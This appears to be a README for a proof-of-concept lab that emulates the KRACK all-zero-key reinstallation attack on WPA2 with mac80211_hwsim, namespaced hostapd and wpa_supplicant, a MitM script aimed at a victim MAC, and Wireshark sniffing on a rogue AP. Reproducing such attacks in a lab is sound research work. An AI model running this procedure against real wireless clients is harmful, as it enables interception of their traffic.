# Proof Of Concept (Emulation with mac80211_hwsim)

## Assumptions
In this tutorial we assume that the machine is connected to the Internet via 2 interfaces, that here we call `eth0` and `eth1`. Furthermore, we also assume that, after loading the module `man80211_hwsim` with `N` radios, their respective virtual interfaces will be named `wlan0, wlan1, ..., wlan(N-1)` by the system.

We tested the simulation in a **Virtual Machine running Kali Linux, with two Network Adapters between it and the Host Machine using NAT**. 

NOTE: We had hard times trying the attack on other Distros.

## Initialise the Network Emulation

First, make sure that both interfaces `eth0` and `eth1` are available.

```bash
sudo ./init_network.sh eth1
```

```bash
sudo systemctl stop dnsmasq.service # Only if it is running
```

## Create and connect Supplicant and Authenticator
### Start the Access Point

```bash
sudo ip netns exec hostapd ./enable_internet_forwarding.sh eth1 wlan0
sudo ip netns exec hostapd dnsmasq -d -C dnsmasq.conf
```
Open a new Terminal session in this folder and run:

```bash
sudo su
source init_env_sup_ap
ip netns exec hostapd ./hostapd-2.4 hostapd.conf
```

### Start the Supplicant
Open a new Terminal session in this folder and run:
```bash
sudo su
source init_env_sup_ap
ip netns exec supplicant ./wpa_supplicant-2.4 -D nl80211 -i wlan1 -c supplicant.conf
```

### Test connection
Open a new Terminal session in this folder and run:
```bash
sudo ip netns exec hostapd ping krackattacks.com
sudo ip netns exec supplicant dhcpcd -n wlan1
sudo ip netns exec supplicant ping krackattacks.com
```
```bash
sudo ip netns exec supplicant iw dev
```

## Add MitM and perform the Attack
### Initialise Krackattack environment
Open a new Terminal session in `../krackattack-all-zero-tk-key/krackattack` and run:
```bash
sudo su
rfkill unblock wifi
source ../../poc-emulation/init_env_mitm
../../poc-emulation/enable_internet_forwarding.sh eth0 wlan3
pyenv shell 2.7.18
```

### Obtain MitM position and Reinstall Key
In the same session, while root, execute:
```bash
python ./krack_all_zero_tk.py wlan2 wlan3 eth0 "simulnet" -t <victim_mac_addr>
```
### Test connection
In a new session run some tests:
```bash
ping krackattacks.com
sudo ip netns exec supplicant ping krackattacks.com
sudo ip netns exec supplicant iw dev
```
### Sniff the traffic
Open Wireskark and sniff traffic on interface `wlan3` (the Interface of the Rougue AP).

### Check with patched `wpa_supplicant`


## De-initialise the Network Emulation
```bash
sudo ./clear.sh eth1
```
